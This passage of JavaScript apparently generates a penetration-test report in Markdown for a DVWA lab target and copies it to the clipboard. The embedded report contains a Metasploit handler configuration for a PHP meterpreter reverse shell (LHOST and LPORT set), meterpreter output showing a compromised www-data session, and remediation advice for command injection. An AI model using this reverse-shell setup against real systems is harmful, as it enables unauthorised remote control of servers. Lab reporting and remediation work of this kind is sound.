| SQL Injection | CWE-89 | 8.5 | HIGH | Demonstrated |

## 3. Technical Proof of Concept (PoC)
### 3.1 Metasploit Configuration
\`\`\`bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
\`\`\`

### 3.2 Proof of Compromise
\`\`\`bash
meterpreter > sysinfo
OS: Linux dvwa-target 5.4.0-42-generic #46-Ubuntu SMP
meterpreter > getuid
Server username: www-data (uid: 33, gid: 33)
\`\`\`

## 4. Remediation & Hardening Roadmap
1. **Input Sanitization**: Disallow direct passing of user input into \`shell_exec()\`. Validate IP addresses with \`filter_var($ip, FILTER_VALIDATE_IP)\`.
2. **Least Privilege**: Configure web server daemon to run with non-interactive shells (\`/bin/false\`).
3. **WAF Deployment**: Implement web application firewall rules to detect command separators (\`;\`, \`&&\`, \`|\`).

---
*Sign-off: ${auditors}*
`;

    navigator.clipboard.writeText(markdownDoc).then(() => {
      showToast('📋 Copied full Markdown report to clipboard!');
    }).catch(() => {
      showToast('Report generated.');
    });
  });

  // Start Terminal
  initTerminal();
});
